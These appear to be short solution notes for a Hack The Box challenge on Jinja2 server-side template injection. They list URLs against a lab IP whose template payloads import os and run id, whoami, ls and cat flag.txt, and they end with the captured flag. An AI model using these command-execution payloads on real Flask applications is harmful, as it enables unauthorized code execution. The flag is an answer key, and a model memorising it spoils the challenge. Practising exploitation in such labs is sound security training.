'''
Flask/Jinja2
https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/

http://139.59.191.154:32412/{{7*7}}
http://139.59.191.154:32412/{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
http://139.59.191.154:32412/{{request.application.__globals__.__builtins__.__import__('os').popen('whoami').read()}}
http://139.59.191.154:32412/{{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}
http://139.59.191.154:32412/{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read()}}

HTB{t3mpl4t3s_4r3_m0r3_p0w3rfu1_th4n_u_th1nk!} 
'''
